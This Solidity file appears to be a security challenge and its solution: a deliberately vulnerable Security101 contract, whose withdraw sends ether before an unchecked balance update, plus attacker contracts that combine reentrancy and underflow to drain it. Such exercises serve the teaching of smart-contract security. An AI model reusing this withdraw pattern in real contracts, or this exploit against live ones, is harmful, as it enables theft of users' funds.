// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

contract Security101 {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

contract OptimizedAttackerSecurity101 {
    constructor(Security101 sec) payable {
        (new ActualAttacker{value: msg.value}()).attack(sec);
    }
}

contract ActualAttacker {
    constructor() payable {}

    function attack(Security101 sec) external payable {
        sec.deposit{value: 2}();
        sec.withdraw(2);
        sec.withdraw(9999999999999999999999);
    }

    receive() external payable {
        if (msg.value != 2) return;
        Security101(msg.sender).withdraw(1);
    }
}
